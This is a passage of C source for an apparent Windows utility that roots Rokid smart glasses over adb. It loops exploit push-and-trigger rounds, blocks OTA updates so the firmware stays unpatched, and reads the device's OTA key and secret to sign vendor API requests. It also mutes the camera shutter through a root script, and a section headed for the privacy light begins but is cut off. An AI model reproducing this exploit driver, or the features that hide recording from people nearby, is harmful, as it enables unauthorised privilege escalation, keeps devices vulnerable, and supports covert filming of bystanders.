                        withnl, timeout_ms);
    free(withnl);
    return out;
}

static int daemon_alive(void) {
    char *o = adb_out(L"shell \"grep -c root_daemon.sock /proc/net/unix 2>/dev/null\"",
                      NULL, 30000);
    if (!o) return 0;
    trim_crlf(o);
    int alive = (atoi(o) > 0);
    free(o);
    return alive;
}

static void do_verify(void) {
    log_msg(STR_LOG_VERIFY_HEADER);

    if (!daemon_alive()) {
        /* 沒有 socket 就不用送指令了，直接回報 */
        log_msg(STR_LOG_VERIFY_FAIL);
        stat_msg(STR_ST_ROOT_MISSING);
        return;
    }
    log_msg(STR_LOG_DAEMON_ALIVE);

    char *out = root_cmd("id; getenforce", 45000);
    if (out) {
        trim_crlf(out);
        log_msg(STR_LOG_VERIFY_ID);
        log_u8(out);
        int ok = (strstr(out, "uid=0") != NULL);
        if (ok) {
            log_msg(STR_LOG_VERIFY_OK);
            stat_msg(STR_ST_ROOT_OK);
        } else {
            log_msg(STR_LOG_VERIFY_FAIL);
            stat_msg(STR_ST_ROOT_MISSING);
        }
        free(out);
    } else {
        log_msg(STR_LOG_VERIFY_FAIL);
        stat_msg(STR_ST_ROOT_MISSING);
    }

    log_msg(STR_LOG_LASTDONE);
    adb_logged(L"shell \"cat " DEV_BRIDGE_W "/last.done 2>/dev/null\"",
               NULL, 30000);
}

/* ---------------- 一鍵取得 root ---------------- */

/* 單次輪詢 last.out / last.progress；1=OK 0=繼續 -1=裝置離線 */
static int poll_once(char *prog, size_t progsz) {
    char sn[128], md[128];
    if (device_state(sn, sizeof(sn), md, sizeof(md)) != 1) return -1;

    char *out = adb_out(L"shell \"cat " DEV_BRIDGE_W "/last.out 2>/dev/null\"",
                        NULL, 30000);
    if (out) {
        trim_crlf(out);
        int ok = (strcmp(out, "OK") == 0);
        if (!ok && *out) log_u8(out);
        free(out);
        if (ok) return 1;
    }

    char *p = adb_out(L"shell \"cat " DEV_BRIDGE_W "/last.progress 2>/dev/null\"",
                      NULL, 30000);
    if (p) {
        trim_crlf(p);
        if (p[0] && strcmp(prog, p) != 0) {
            snprintf(prog, progsz, "%s", p);
            wchar_t *wp = utf8_to_wide(p);
            if (wp) { log_msg(STR_LOG_PROGRESS, wp); free(wp); }
        }
        free(p);
    }
    return 0;
}

static void do_oneclick(void) {
    /* 先清掉上一次失敗洩漏的程序，免得在已經很亂的裝置上再疊一層 */
    cleanup_stray_exploits();
    log_msg(STR_LOG_ONECLICK_HEADER, MAX_BOOTS);

    if (fw_is_patched()) {
        log_msg(STR_LOG_FW_PATCHED_ALERT, g_fw);
        stat_msg(STR_ST_FW_PATCHED_BLOCK);
        return;
    }

    /*
     * 順序很重要：**先**觀測開機（把剛剛發生的重開記進 boot_hist／可疑計數），
     * **再**做預檢。反過來的話，預檢會用到「還沒包含這次重開」的舊歷史，
     * 剛重開完立刻按一鍵就不會被警告 —— 而那正是最需要警告的時候。
     */
    loop_note_boot(0);

    /* P0-b 開機迴圈預檢 + P2 供電警告（可覆寫）。取消就整個不跑。 */
    if (!preflight_warnings()) return;

    int done = 0, prev_uptime = device_uptime();

    for (int boot = 1; boot <= MAX_BOOTS && !done; boot++) {
        if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) break;

        /* P0-a 斷路器：每一輪開始前先看「上一輪之後裝置有沒有又重開」 */
        if (loop_note_boot(0)) {
            log_msg(STR_LOG_BREAKER_STOP);
            break;
        }

        /* 1) 等裝置上線 */
        if (!wait_device(WAIT_DEVICE_S)) {
            log_msg(STR_LOG_WAIT_DEVICE_TIMEOUT);
            break;
        }

        /* 2) 等開機完成 + 系統穩定（避開自動觸發的 exploit / OOM 視窗） */
        if (!boot_completed()) {
            log_msg(STR_LOG_WAIT_BOOTCOMPLETE);
            for (int i = 0; i < 120 && !boot_completed(); i++) {
                if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) break;
                Sleep(2000);
            }
        }
        for (int i = 0; i < 90; i++) {
            if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) break;
            int up = device_uptime();
            if (up < 0) break;
            if (up > MIN_UPTIME_S) break;
            log_msg(STR_LOG_WAIT_UPTIME, up, MIN_UPTIME_S);
            Sleep(5000);
        }
        if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) break;

        /* 3) 開機健康閘門 */
        int th = device_threads();
        if (th > MAX_THREADS) {
            log_msg(STR_LOG_BOOT_UNHEALTHY, th);
            Sleep(15000);
        }

        /* 4) 重開機偵測（uptime 回退） */
        int up = device_uptime();
        if (up >= 0 && prev_uptime >= 0 && up < prev_uptime - 5) {
            log_msg(STR_LOG_REBOOT_DETECTED, prev_uptime, up);
        }
        if (up >= 0) prev_uptime = up;

        int rebooted = 0;
        for (int trig = 1; trig <= TRIGGERS_PER_BOOT && !done && !rebooted; trig++) {
            if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) break;

            log_msg(STR_LOG_BOOT_ROUND, boot, MAX_BOOTS, trig, TRIGGERS_PER_BOOT);
            /* P1：讓使用者看到「這是第幾次 / 總共幾次」的 50% 賭注 */
            log_msg(STR_LOG_ATTEMPT_COUNT,
                    (boot - 1) * TRIGGERS_PER_BOOT + trig, LOOP_ATTEMPTS_TOTAL);
            prog_set(0);

            /* P0-a：記下武裝時間。若這之後 ≤10 分鐘裝置就重開，會被記為可疑。 */
            loop_mark_arm();

            do_push();
            if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) break;
            do_helper();
            if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) break;
            do_trigger();

            char prog[192] = "";
            int ticks = ROUND_TIMEOUT_S / POLL_S;
            int rf = device_uptime();
            for (int t = 0; t < ticks; t++) {
                if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) break;
                int r = poll_once(prog, sizeof(prog));
                if (r == 1) { done = 1; break; }
                if (r == -1) {
                    log_msg(STR_LOG_DEVICE_OFFLINE_REBOOT);
                    rebooted = 1;
                    break;
                }
                int u2 = device_uptime();
                if (u2 >= 0 && rf >= 0 && u2 < rf - 5) {
                    log_msg(STR_LOG_REBOOT_DETECTED, rf, u2);
                    rebooted = 1;
                    prev_uptime = u2;
                    break;
                }
                prog_set((int)(100.0 * t / ticks));
                Sleep(POLL_S * 1000);
            }
            if (!done && !rebooted && InterlockedCompareExchange(&g_cancel, 0, 0) == 0) {
                log_msg(STR_LOG_ROUND_FAILED);
            }
        }
    }

    prog_set(-1);

    if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) {
        log_msg(STR_LOG_CANCELLED);
        stat_msg(STR_ST_CANCELLED);
        return;
    }
    if (done) {
        log_msg(STR_LOG_ROOT_ACHIEVED);
        /* 成功了就不需要再武裝 → 清掉迴圈計數，避免殘留影響下一次 */
        loop_reset();
        do_verify();
        /*
         * 一併更新裝置資訊面板。面板只由「重新整理」更新，若不補這一步，
         * 一鍵成功後面板仍顯示 "root：未執行"，與狀態列的「root ✓」互相矛盾
         * （實測就是如此）。
         */
        do_refresh();
    } else {
        log_msg(STR_LOG_ALL_FAILED, MAX_BOOTS);
        log_msg(STR_LOG_ALL_FAILED_HINT);
        stat_msg(STR_ST_ONECLICK_FAILED);
    }
}

/* ---------------- 偵測裝置 ---------------- */

static void do_refresh(void) {
    /*
     * quiet = 1：背景輪詢模式。只更新狀態、不寫紀錄，
     * 否則每 30 秒就會洗一次版，把使用者真正在看的訊息沖掉。
     */
    const int quiet = (InterlockedCompareExchange(&g_quiet_probe, 0, 0) != 0);
    if (!quiet) log_msg(STR_LOG_REFRESH_HEADER);

    char sn[128] = "", md[128] = "";
    int st = device_state(sn, sizeof(sn), md, sizeof(md));

    if (st != 1) {
        EnterCriticalSection(&g_dev_cs);
        int changed = (g_dev.state != st);
        g_dev.state = st;
        if (changed) { g_dev.rooted = 0; g_dev.shizuku = 0;
                       g_dev.shizuku_installed = -1;   /* 未知，下次連上再探 */
                       g_dev.serial[0] = g_dev.fw[0] = g_dev.model[0] = L'\0'; }
        LeaveCriticalSection(&g_dev_cs);
        /*
         * 靜默輪詢只在「狀態沒變」時才安靜。
         * 狀態一改變就一定要出聲 —— 否則像「找不到指定的裝置」這種
         * 讓整個工具不能用的原因，會被 30 秒輪詢永遠蓋掉，使用者完全不知道
         * 為什麼按了都沒反應。狀態列則每次更新（它是即時指示器）。
         */
        if (st == -1)             stat_msg(STR_ST_UNAUTHORIZED);
        else if (st == -2)        stat_msg(STR_ST_OFFLINE);
        else if (st == -3)        stat_msg(STR_ST_NO_DEVICE);
        else if (st == DEV_NOT_FOUND) stat_msg(STR_ST_DEV_NOT_FOUND);
        else                      stat_msg(STR_ST_NO_DEVICE);

        if (!quiet || st != g_reported_state) {
            if (st == -1)             log_msg(STR_LOG_DEV_UNAUTHORIZED);
            else if (st == -2)        log_msg(STR_LOG_DEV_OFFLINE);
            else if (st == -3)        log_msg(STR_LOG_ADB_UNAVAILABLE);
            else if (st == DEV_NOT_FOUND) log_msg(STR_LOG_DEV_NOT_FOUND, g_serial);
            else { log_msg(STR_LOG_NO_DEVICE_FOUND); info_w(T(STR_DEV_PANEL_EMPTY)); }
        }
        g_reported_state = st;
        info_w(L"");
        return;
    }

    if (!g_serial[0]) {
        /* 使用者尚未指定序號 → 採用偵測到的第一台，並記住它 */
        wchar_t *wsn = utf8_to_wide(sn);
        wcsncpy(g_serial, wsn ? wsn : L"", 127);
        g_serial[127] = L'\0';
        if (wsn) free(wsn);
        serial_w(g_serial);
        settings_save();
    }
    if (!quiet) log_msg(STR_LOG_DEV_SELECTED, g_serial);
    g_reported_state = 1;

    /* 一次 shell 呼叫取回所有遙測（用 KEY=value 標記，避免解析歧義） */
    const wchar_t *probe =
        L"shell \""
        L"echo 'S='$(getprop ro.serialno); "
        L"echo 'M='$(getprop ro.product.model); "
        L"echo 'I='$(getprop ro.build.version.incremental); "
        L"echo 'P='$(getprop ro.build.version.security_patch); "
        L"echo 'R='$(getprop ro.build.version.release); "
        L"echo 'B='$(getprop sys.boot_completed); "
        L"echo 'U='$(cut -d' ' -f1 /proc/uptime); "
        L"echo 'D='$(grep -c root_daemon.sock /proc/net/unix 2>/dev/null); "
        L"echo 'K='$(ps -A -o ARGS 2>/dev/null | grep -c shizuku_serve[r]); "
        L"echo 'X='$(id); "
        L"echo 'E='$(getenforce); "
        L"echo 'A='$(grep -c media/audio/ui /proc/mounts 2>/dev/null); "
        L"echo 'H='$(ls /data/local/tmp/zl_led_hold 2>/dev/null | wc -l); "
        L"echo 'T='$(dumpsys package com.rokid.glass.ota 2>/dev/null | grep -c 'suspended=true'); "
        L"echo 'Z='$(pm path moe.shizuku.privileged.api 2>/dev/null | wc -l)"
        L"\"";
    char *o = adb_out(probe, NULL, 40000);
    if (!o) {
        stat_msg(STR_ST_NO_DEVICE);
        return;
    }

    char *vS = kv_get_def(o, "S", "");
    char *vM = kv_get_def(o, "M", "");
    char *vI = kv_get_def(o, "I", "");
    char *vP = kv_get_def(o, "P", "");
    char *vR = kv_get_def(o, "R", "");
    char *vU = kv_get_def(o, "U", "0");
    char *vD = kv_get_def(o, "D", "0");
    char *vK = kv_get_def(o, "K", "0");
    char *vX = kv_get_def(o, "X", "");
    char *vE = kv_get_def(o, "E", "");
    char *vA = kv_get_def(o, "A", "0");
    char *vH = kv_get_def(o, "H", "0");
    char *vT = kv_get_def(o, "T", "0");
    char *vZ = kv_get_def(o, "Z", "0");
    free(o);

    /* 韌體狀態 */
    g_fw_state = fw_classify(vI);
    wchar_t *wI = utf8_to_wide(vI);
    wcsncpy(g_fw, (wI && *wI) ? wI : L"?", 127);
    g_fw[127] = L'\0';
    if (wI) free(wI);

    if (g_fw_state == 2)      log_msg(STR_LOG_FW_PATCHED_ALERT, g_fw);
    else if (g_fw_state == 0) log_msg(STR_LOG_FW_OLD_ALERT, g_fw);

    /* ---- 填入結構化裝置資訊（自繪 UI 直接讀這些欄位） ---- */
    static zl_dev_t d;                 /* 先寫暫存，最後在臨界區內一次複製 */
    memset(&d, 0, sizeof(d));
    d.state    = 1;
    d.fw_state = g_fw_state;
    d.rooted   = (vD && atoi(vD) > 0);
    d.shizuku  = (vK && atoi(vK) > 0);
    d.shizuku_installed = (vZ && atoi(vZ) > 0) ? 1 : 0;
    d.uptime   = (long)strtod(vU, NULL);
    d.ota_locked = (vT && atoi(vT) > 0);
    d.silent_on  = (vA && atoi(vA) > 0);
    d.led_off    = (vH && atoi(vH) > 0);

    #define CPYF(dst, src) do { \
        wchar_t *_t = utf8_to_wide(src ? src : ""); \
        wcsncpy((dst), _t ? _t : L"", (sizeof(dst)/sizeof(wchar_t)) - 1); \
        (dst)[(sizeof(dst)/sizeof(wchar_t)) - 1] = L'\0'; \
        if (_t) free(_t); } while (0)
    CPYF(d.serial,  vS);
    CPYF(d.model,   vM);
    CPYF(d.spl,     vP);
    CPYF(d.android, vR);
    CPYF(d.selinux, vE);
    #undef CPYF
    {
        wchar_t *t = utf8_to_wide(vI);
        wcsncpy(d.fw, t ? t : L"", 127);
        d.fw[127] = L'\0';
        if (t) free(t);
    }
    EnterCriticalSection(&g_dev_cs);
    memcpy(&g_dev, &d, sizeof(g_dev));
    LeaveCriticalSection(&g_dev_cs);

    if (!quiet) {
        if (g_fw_state == 2)      log_msg(STR_LOG_FW_PATCHED_ALERT, g_dev.fw);
        else if (g_fw_state == 0) log_msg(STR_LOG_FW_OLD_ALERT, g_dev.fw);
        if (vX && *vX) log_u8(vX);
        if (vE && *vE) log_u8(vE);
    }

    free(vS); free(vM); free(vI); free(vP);
    free(vR); free(vU); free(vD); free(vK); free(vX); free(vE);
    free(vA); free(vH); free(vT); free(vZ);

    if (g_fw_state == 2) {
        stat_msg(STR_ST_FW_PATCHED_BLOCK);
    } else if (g_dev.rooted) {
        stat_msg(STR_ST_CONNECTED_ROOTED);
    } else {
        stat_msg(STR_ST_CONNECTED_NOT_ROOTED);
    }
}

/* ---------------- OTA 鎖定 ---------------- */

static void do_ota_lock(int lock) {
    wchar_t sub[1024];

    if (lock) {
        log_msg(STR_LOG_OTALOCK_HEADER);
        log_msg(STR_LOG_OTALOCK_SUSPEND, PKG_OTA_W);
        swprintf(sub, 1024, L"shell \"pm suspend %ls\"", PKG_OTA_W);
        adb_logged(sub, NULL, 40000);

        /* 驗證：dumpsys 應出現 suspended=true */
        int ok = 0;
        char *chk = adb_out(L"shell \"dumpsys package com.rokid.glass.ota 2>/dev/null | grep -c 'suspended=true'\"",
                            NULL, 40000);
        if (chk) { trim_crlf(chk); ok = (atoi(chk) > 0); free(chk); }

        if (!ok) {
            /* 兜底：一般裝置走 disable-user */
            log_msg(STR_LOG_OTALOCK_DISABLE, PKG_OTA_W);
            swprintf(sub, 1024, L"shell \"pm disable-user --user 0 %ls\"", PKG_OTA_W);
            adb_logged(sub, NULL, 40000);
            char *d = adb_out(L"shell \"pm list packages -d 2>/dev/null | grep -c com.rokid.glass.ota\"",
                              NULL, 40000);
            if (d) { trim_crlf(d); ok = (atoi(d) > 0); free(d); }
        }

        if (ok) log_msg(STR_LOG_OTALOCK_OK, PKG_OTA_W);
        else    log_msg(STR_LOG_OTALOCK_FAIL);
    } else {
        log_msg(STR_LOG_OTAUNLOCK_HEADER);
        swprintf(sub, 1024, L"shell \"pm unsuspend %ls\"", PKG_OTA_W);
        adb_logged(sub, NULL, 40000);
        swprintf(sub, 1024, L"shell \"pm enable %ls\"", PKG_OTA_W);
        adb_logged(sub, NULL, 40000);
        log_msg(STR_LOG_OTAUNLOCK_OK, PKG_OTA_W);
    }
}

/* ---------------- OTA 修補檢查 ---------------- */

/* 回傳 1 = 成功；0 = BCrypt 失敗（此時 out 為空字串） */
static int md5_hex(const char *data, size_t len, char out[33]) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BYTE obj[256], digest[16];
    DWORD cbObj = 0, cbDigest = 0, cb = 0;

    out[0] = '\0';
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_MD5_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbObj, sizeof(cbObj), &cb, 0) != 0
        || cbObj > sizeof(obj)) goto done;
    if (BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&cbDigest, sizeof(cbDigest), &cb, 0) != 0
        || cbDigest != 16) goto done;
    if (BCryptCreateHash(hAlg, &hHash, obj, cbObj, NULL, 0, 0) != 0) goto done;
    if (BCryptHashData(hHash, (PUCHAR)data, (ULONG)len, 0) != 0) goto done;
    if (BCryptFinishHash(hHash, digest, 16, 0) != 0) goto done;
    for (int i = 0; i < 16; i++) sprintf(out + i * 2, "%02x", digest[i]);
    out[32] = '\0';

done:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return (out[0] != '\0') ? 1 : 0;
}

/* HTTPS POST（WinHTTP）；回傳回應本文（需 free） */
static char *http_post(const wchar_t *host, const wchar_t *path,
                       const wchar_t *auth, const char *body) {
    HINTERNET hS = NULL, hC = NULL, hR = NULL;
    char *resp = NULL;
    size_t cap = 0, len = 0;

    hS = WinHttpOpen(L"ZeroLightRokidDesktop/" ZL_VERSION,
                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return NULL;
    WinHttpSetTimeouts(hS, 10000, 10000, 15000, 20000);

    hC = WinHttpConnect(hS, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hC) goto done;
    hR = WinHttpOpenRequest(hC, L"POST", path, NULL, WINHTTP_NO_REFERER,
                            WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hR) goto done;

    {
        wchar_t hdr[2048];
        /* WinHTTP 要求標頭字串必須以 CRLF 結尾，否則最後一個標頭可能與
           自動產生的標頭串接在一起。 */
        swprintf(hdr, 2048,
                 L"Content-Type: application/json;charset=utf-8\r\nAuthorization: %ls\r\n",
                 auth);
        if (!WinHttpAddRequestHeaders(hR, hdr, (DWORD)-1L,
                                      WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
            goto done;
        }
    }

    if (!WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)body, (DWORD)strlen(body),
                            (DWORD)strlen(body), 0)) goto done;
    if (!WinHttpReceiveResponse(hR, NULL)) goto done;

    for (;;) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(hR, &avail) || avail == 0) break;
        if (len + avail + 1 > cap) {
            size_t ncap = cap ? cap * 2 : 8192;
            while (ncap < len + avail + 1) ncap *= 2;
            char *nb = (char *)realloc(resp, ncap);
            if (!nb) break;
            resp = nb;
            cap = ncap;
        }
        DWORD got = 0;
        if (!WinHttpReadData(hR, resp + len, avail, &got) || got == 0) break;
        len += got;
    }
    if (resp) { resp[len] = '\0'; }

done:
    if (hR) WinHttpCloseHandle(hR);
    if (hC) WinHttpCloseHandle(hC);
    if (hS) WinHttpCloseHandle(hS);
    return resp;
}

/* 從 JSON 取字串值（極簡掃描；需 free） */
static char *json_str(const char *json, const char *key) {
    if (!json || !key) return NULL;
    char pat[128];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return NULL;
    p += strlen(pat);
    while (*p && *p != ':') p++;
    if (*p != ':') return NULL;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    if (*p != '"') return NULL;
    p++;
    const char *e = p;
    while (*e && *e != '"') {
        if (*e == '\\' && e[1]) e++;
        e++;
    }
    size_t n = (size_t)(e - p);
    char *v = (char *)xmalloc(n + 1);
    if (!v) return NULL;
    memcpy(v, p, n);
    v[n] = '\0';
    return v;
}

static void do_ota_check(void) {
    log_msg(STR_LOG_OTACHECK_HEADER);

    char *sysver = adb_out(L"shell \"getprop ro.build.version.incremental\"", NULL, 30000);
    char *serial = adb_out(L"shell \"getprop ro.serialno\"", NULL, 30000);
    char *key    = adb_out(L"shell \"getprop ro.boot.key\"", NULL, 30000);
    char *secret = adb_out(L"shell \"getprop ro.boot.secret\"", NULL, 30000);
    char *dtid   = adb_out(L"shell \"getprop ro.boot.devicetypeid\"", NULL, 30000);
    char *spl    = adb_out(L"shell \"getprop ro.build.version.security_patch\"", NULL, 30000);

    if (sysver) trim_crlf(sysver);
    if (serial) trim_crlf(serial);
    if (key)    trim_crlf(key);
    if (secret) trim_crlf(secret);
    if (dtid)   trim_crlf(dtid);
    if (spl)    trim_crlf(spl);

    /* 裝置未提供時的預設值。
     *
     * 注意：這裡原本內建本機裝置的 ro.boot.key／ro.boot.secret／
     * ro.boot.devicetypeid 與裝置序號。那些值屬於裝置綁定的 OTA API 憑證，
     * 已在發布前遮蔽（見 repo 根目錄 REDACTION_LOG.md）。
     *
     * 正常情況下這些 getprop 都會有值，因此本分支不會被觸發；若真的觸發，
     * 代表裝置未回報憑證，此時以佔位符送請求只會得到難懂的伺服器錯誤，
     * 因此直接跳過並提示使用者自行填入。 */
    if (!key    || !*key)    { free(key);    key    = xstrdup("<REDACTED_OTA_KEY>"); }
    if (!secret || !*secret) { free(secret); secret = xstrdup("<REDACTED_OTA_SECRET>"); }
    if (!dtid   || !*dtid)   { free(dtid);   dtid   = xstrdup("<REDACTED_OTA_DEVICETYPEID>"); }
    if (!serial || !*serial) { free(serial); serial = xstrdup("<DEVICE_SERIAL>"); }
    if (!sysver || !*sysver) { free(sysver); sysver = xstrdup("0.0.0"); }
    /* xstrdup 可能因記憶體不足回傳 NULL，而這些值會直接進 snprintf 的 %s */
    if (!key || !secret || !dtid || !serial || !sysver) {
        log_msg(STR_LOG_OTACHECK_NETFAIL, L"out of memory");
        goto cleanup;
    }
    /* 佔位符仍在 → 裝置沒有回報憑證，不要送出注定失敗的請求 */
    if (strncmp(key, "<REDACTED_", 10) == 0 ||
        strncmp(secret, "<REDACTED_", 10) == 0 ||
        strncmp(dtid, "<REDACTED_", 10) == 0) {
        log_msg(STR_LOG_OTACHECK_NOCRED);
        goto cleanup;
    }

    wchar_t *wsys = utf8_to_wide(sysver);
    wchar_t *wspl = utf8_to_wide(spl ? spl : "");
    log_msg(STR_LOG_OTACHECK_CUR, wsys ? wsys : L"?");
    log_msg(STR_LOG_OTACHECK_SPL, wspl ? wspl : L"?");
    if (wsys) free(wsys);
    if (wspl) free(wspl);

    /* sign = MD5("key=..&device_type_id=..&device_id=..&service=ota&version=1.0&time=<ts>&secret=..") */
    long long ts = (long long)time(NULL);
    char tosign[1024], sign[33];
    int w1 = snprintf(tosign, sizeof(tosign),
             "key=%s&device_type_id=%s&device_id=%s&service=ota&version=1.0&time=%lld&secret=%s",
             key, dtid, serial, ts, secret);
    if (w1 < 0 || (size_t)w1 >= sizeof(tosign)) {
        log_msg(STR_LOG_OTACHECK_NETFAIL, L"signature string too long");
        goto cleanup;
    }
    if (!md5_hex(tosign, strlen(tosign), sign)) {
        log_msg(STR_LOG_OTACHECK_NETFAIL, L"MD5 (BCrypt) failed");
        goto cleanup;
    }

    char auth[1024];
    int w2 = snprintf(auth, sizeof(auth),
             "version=1.0;time=%lld;sign=%s;key=%s;device_type_id=%s;device_id=%s;service=ota",
             ts, sign, key, dtid, serial);
    if (w2 < 0 || (size_t)w2 >= sizeof(auth)) {
        log_msg(STR_LOG_OTACHECK_NETFAIL, L"auth header too long");
        goto cleanup;
    }

    char body[512];
    int w3 = snprintf(body, sizeof(body),
             "{\"version\":\"%s\",\"osType\":\"\",\"cpuType\":\"\"}", sysver);
    if (w3 < 0 || (size_t)w3 >= sizeof(body)) {
        log_msg(STR_LOG_OTACHECK_NETFAIL, L"request body too long");
        goto cleanup;
    }

    wchar_t wauth[1024];
    {
        wchar_t *t = utf8_to_wide(auth);
        wcsncpy(wauth, t ? t : L"", 1023);
        wauth[1023] = L'\0';
        if (t) free(t);
    }

    char *resp = http_post(OTA_HOST, OTA_PATH, wauth, body);
    if (!resp) {
        log_msg(STR_LOG_OTACHECK_NETFAIL, OTA_HOST);
        goto cleanup;
    }

    {
        char *code = json_str(resp, "code");
        char *ver  = json_str(resp, "version");
        char *url  = json_str(resp, "imageUrl");

        if (!code || strcmp(code, "OK") != 0) {
            wchar_t *wc = utf8_to_wide(resp);
            wchar_t shortbuf[256];
            wcsncpy(shortbuf, wc ? wc : L"", 255);
            shortbuf[255] = L'\0';
            log_msg(STR_LOG_OTACHECK_PARSEFAIL, shortbuf);
            if (wc) free(wc);
        } else {
            wchar_t *wv = utf8_to_wide(ver ? ver : "");
            wchar_t *wu = utf8_to_wide(url ? url : "");
            log_msg(STR_LOG_OTACHECK_LATEST, wv ? wv : L"?");
            if (wu && *wu) log_msg(STR_LOG_OTACHECK_IMGURL, wu);

            int cls = fw_classify(ver ? ver : "");
            if (cls == 2)      log_msg(STR_LOG_OTACHECK_PATCHED, wv ? wv : L"?", FW_PATCHED_VER_W);
            else if (cls == 1) log_msg(STR_LOG_OTACHECK_VULN, wv ? wv : L"?", FW_PATCHED_VER_W);
            else               log_msg(STR_LOG_OTACHECK_UP2DATE);

            if (wv) free(wv);
            if (wu) free(wu);
        }
        if (code) free(code);
        if (ver) free(ver);
        if (url) free(url);
    }
    free(resp);

cleanup:
    free(sysver); free(serial); free(key); free(secret); free(dtid); free(spl);
}

/* ---------------- Shizuku ---------------- */

static void do_shizuku(void) {
    log_msg(STR_LOG_SHIZUKU_HEADER);

    char *apkpath = adb_out(L"shell \"pm path moe.shizuku.privileged.api 2>/dev/null\"",
                            NULL, 30000);
    if (apkpath) trim_crlf(apkpath);

    if (!apkpath || !*apkpath) {
        if (apkpath) free(apkpath);
        if (!g_apk[0]) {
            log_msg(STR_LOG_SHIZUKU_NOT_INSTALLED, PKG_SHIZUKU_W);
            return;
        }
        log_msg(STR_LOG_SHIZUKU_INSTALLING, g_apk);
        wchar_t sub[8192];
        swprintf(sub, 8192, L"install -r \"%ls\"", g_apk);
        adb_logged(sub, NULL, 180000);
        apkpath = adb_out(L"shell \"pm path moe.shizuku.privileged.api 2>/dev/null\"", NULL, 30000);
        if (apkpath) trim_crlf(apkpath);
        if (!apkpath || !*apkpath) {
            log_msg(STR_LOG_SHIZUKU_INSTALL_FAIL);
            if (apkpath) free(apkpath);
            return;
        }
    }

    /* package:/data/app/.../base.apk → /data/app/.../lib/arm64/libshizuku.so */
    char lib[1024];
    {
        char *colon = strchr(apkpath, ':');
        char *p = colon ? colon + 1 : apkpath;
        size_t n = strlen(p);
        if (n > 8 && strcmp(p + n - 8, "base.apk") == 0) p[n - 8] = '\0';
        snprintf(lib, sizeof(lib), "%slib/arm64/libshizuku.so", p);
    }
    free(apkpath);

    wchar_t *wlib = utf8_to_wide(lib);
    log_msg(STR_LOG_SHIZUKU_LIB, wlib ? wlib : L"?");

    {
        wchar_t sub[2048];
        swprintf(sub, 2048, L"shell \"[ -x %ls ] && echo yes || echo no\"", wlib ? wlib : L"");
        char *ex = adb_out(sub, NULL, 30000);
        int ok = 0;
        if (ex) { trim_crlf(ex); ok = (strcmp(ex, "yes") == 0); free(ex); }
        if (!ok) {
            log_msg(STR_LOG_SHIZUKU_LIB_MISSING, wlib ? wlib : L"?");
            if (wlib) free(wlib);
            return;
        }
    }

    log_msg(STR_LOG_SHIZUKU_GRANT, PERM_SHIZUKU_W);
    adb_logged(L"shell \"pm grant com.rokid.rc.glasses moe.shizuku.manager.permission.API_V23\"",
               NULL, 40000);

    /* 先殺舊 server（字元類別避免自我匹配），再啟動 */
    adb_logged(L"shell \"pkill -9 -f shizuku_serve[r] 2>/dev/null; true\"", NULL, 30000);
    log_msg(STR_LOG_SHIZUKU_STARTING);
    {
        wchar_t sub[2048];
        swprintf(sub, 2048, L"shell \"%ls\"", wlib ? wlib : L"");
        adb_logged(sub, NULL, 60000);
    }
    if (wlib) free(wlib);
    Sleep(3500);

    char *chk = adb_out(L"shell \"ps -A -o ARGS 2>/dev/null | grep -c shizuku_serve[r]\"",
                        NULL, 30000);
    int alive = 0;
    if (chk) { trim_crlf(chk); alive = (atoi(chk) > 0); free(chk); }
    if (alive) log_msg(STR_LOG_SHIZUKU_OK);
    else       log_msg(STR_LOG_SHIZUKU_FAIL);
}

/* ---------------- 靜音拍攝 / 隱私燈 ---------------- */

/* 檢查是否有 root 可用；沒有就提示並回 0 */
static int require_root(void) {
    if (daemon_alive()) return 1;
    log_msg(STR_LOG_NEED_ROOT);
    return 0;
}

static void do_silent(int on) {
    log_msg(STR_LOG_SILENT_HEADER, on ? T(STR_BTN_SILENT_ON) : T(STR_BTN_SILENT_OFF));
    if (!require_root()) return;

    if (on) {
        wchar_t ogg[MAX_PATH], sub[8192];
        if (!asset_path(ogg, MAX_PATH, L"silent_camera.ogg")) {
            log_msg(STR_LOG_SILENT_NOASSET);
            return;
        }
        swprintf(sub, 8192, L"push \"%ls\" %ls", ogg, DEV_SILENT_OGG_W);
        adb_logged(sub, NULL, 120000);
    }

    adb_logged(L"shell \"cat > /data/local/tmp/zl_silent.sh\"", SILENT_SCRIPT, 40000);
    adb_logged(L"shell \"chmod 755 /data/local/tmp/zl_silent.sh\"", NULL, 30000);

    char *out = root_cmd(on ? "sh /data/local/tmp/zl_silent.sh on"
                            : "sh /data/local/tmp/zl_silent.sh off", 120000);
    if (out) {
        trim_crlf(out);
        if (*out) log_u8(out);
        free(out);
    }
    log_msg(on ? STR_LOG_SILENT_ON : STR_LOG_SILENT_OFF);
}

static void do_led(int off) {
    log_msg(STR_LOG_LED_HEADER, off ? T(STR_BTN_LED_OFF) : T(STR_BTN_LED_ON));
    if (!require_root()) return;

